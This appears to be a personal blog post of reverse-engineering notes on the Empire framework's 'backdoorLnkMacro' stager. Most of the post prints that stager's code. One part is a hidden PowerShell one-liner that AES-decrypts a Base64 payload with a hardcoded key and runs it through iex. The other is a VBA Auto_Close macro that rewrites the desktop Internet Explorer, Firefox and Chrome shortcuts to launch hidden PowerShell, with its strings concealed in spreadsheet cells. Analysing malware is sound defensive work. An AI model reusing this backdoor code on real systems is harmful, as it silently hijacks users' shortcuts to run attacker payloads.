<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="OWicca"><meta name=generator content="Hugo 0.69.0-DEV"><title>Malware techniques RE — Down the wabbit's hole</title><meta name=description content><link rel=canonical href=https://www.dinudev.com/post/malware_techniques_re/><link href rel=alternate type=application/rss+xml title="Down the wabbit's hole"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Arvo:400,700"><link rel=stylesheet href=https://www.dinudev.com/css/highlight.css><link rel=stylesheet href=https://www.dinudev.com/css/paperback.css><link rel=stylesheet href=https://www.dinudev.com//main.css></head><body><div class=container><header><h1>Malware techniques RE</h1><time datetime="2020-02-16 21:18:00 +0200 EET">2020/02/16</time><nav class=site-nav><a href=/>Home</a>
<a href=/post/>All posts</a></nav></header><article><h3 id=empire>empire:</h3><ul><li>stagers:<ul><li>backdoorLnkMacro:<ul><li>backdoor .lnk on desktop that on click will attempt to download and run an empire agent</li><li>structure:<ul><li>xls file with data</li><li>macro to be injected into the xls</li><li>xml holds data about empire install</li></ul></li></ul></li></ul></li></ul><p>targetEXE = &ldquo;iexplore,Firefox, CHROME "
killDate = 02/22/2020</p><p>shellVar = &lsquo;fwpjyHSAr&rsquo;
lnkVar = &lsquo;bIzKAcPke&rsquo;
fsoVar = &lsquo;fYvrDnMq&rsquo;
folderVar = &lsquo;shwYkAlvB&rsquo;
fileVar = &lsquo;WYuEVPGxH&rsquo;
encKey = &lsquo;XAglS;^I_Yye@zam&rsquo;
envIV = 220</p><p>launchString = <code>hidden -nop -c "Start('"
);
$u=New-Object -comObject wscript.shell;
gci -Pa $env:USERPROFILE\desktop -Fi *.lnk|%P$1=$u.createShortcut($_.FullName);
if($1.arguments-like\'*xml.xmldocument*\') {
$s = $1.arguments.IndexOf(\'\'\'\')+1;
$r = $1.arguments.Substring($s, $1.arguments.IndexOf(\'\'\'\', $s) - $s);
$l = $1.Arguments=\'\';
$1.Save()
}
};
$b=New-ObjectSystem.Xml.XmlDocument;
if([int](get-date -U '%Y%m%d') -le 20200222) {
$b.Load('{{XmlPath}}');
$a = New-Object 'Security.Cryptography.AesManaged';
$a.IV=(220..235);
$a.key=[text.encoding]::UTF8.getBytes('{{encKey}}');
$by = [System.Convert]::FromBase64String($b.main);
[Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($by,0,$by.Length)).substring(16)|iex
}</code></p><p>inputRow = 51
inputCol = 58</p><p>write@51:58 => &ldquo;Wscript.shell&rdquo;</p><p><code>Sub Auto_Close()
Set {{shellVar}} = CreateObject(activeSheet.Range("BG52").value)</code>
inputCol = 59
write@51:59 => &ldquo;Scripting.FileSystemObject&rdquo;
<code>Set {{fsoVar}} = CreateObject(activeSheet.Range("BH52").value)</code>
inputCol = 63
write@51:63 => &ldquo;desktop&rdquo;
<code>Set {{folderVar}} = {{fsoVar}}.GetFolder({{shellVar}}.SpecialFolders(activeSheet.Range("BL52").value)
For Each {{fileVar}} In {{folderVar}}.Files
If(InStr(Lcase({{fileVar}}), ".lnk")) Then
Set {{lnkVar}} = {{shellVar}}.CreateShortcut({{shellVar}}.SPecialFolders(activeSheet.Range("BL52").value) & "\\\" & {{fileVar}}.name</code>
inputCol = 67
<code>If(
or
(InStr(
Lcase(
{{lnkVar.targetPath}}
)
),
activeSheet.Range("BP52").value
)</code>
write@51:67 => &ldquo;iexplore.&rdquo;
inputCol = 69
<code>or
(InStr(
Lcase(
{{lnkVar.targetPath}}
)
),
activeSheet.Range("BR52").value
)</code>
write@51:69 => &ldquo;firefox.&rdquo;
inputCol = 70
<code>or
(InStr(
Lcase(
{{lnkVar.targetPath}}
)
),
activeSheet.Range("BS52").value
)</code>
write@51:70 => &ldquo;chrome.&rdquo;
<code>) Then
{{lnkVar}}.IconLocation = {{lnkVar}}.targetpath</code>
inputCol = 72
write@51:72 => first part of launchString
launch1Coords = &ldquo;BU52&rdquo;
inputCol = 73
write@51:73 => last part of launchString
launchSumChoords = &ldquo;BV52&rdquo;
inputcol = 74
<code>{{lnkVar}}.arguments = "-w " & activeSheet.Range("{{launch1Choords}}").Value & {{lnkVar}}.targetPath &
"'" & activeSheet.Range("{{launchSumChoords}}").Value</code>
write@51:74 => &ldquo;:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&rdquo;
<code>{{lnkVar}}.targetpath = left(CurDir, InStr(CurDir, ":")-1) & activeSheet.Range("BW52").value</code>
inputcol = 78
<code>If(Len({{lnkVar}}.arguments) &lt; 1023) Then
{{lnkVar}}.save
end if
end if
end if
next {{fileVar}}
End Sub</code></p><p>hide inputRow</p></article><nav class=site-nav><a href=/>Home</a>
<a href=/post/>All posts</a>
<a href=https://github.com/Owicca>GitHub</a></nav><footer class=site-footer><span class=owner>©2020 OWicca</span></footer></div><script src=https://www.dinudev.com/js/highlight.pack.js></script><script>hljs.initHighlightingOnLoad();</script></body></html>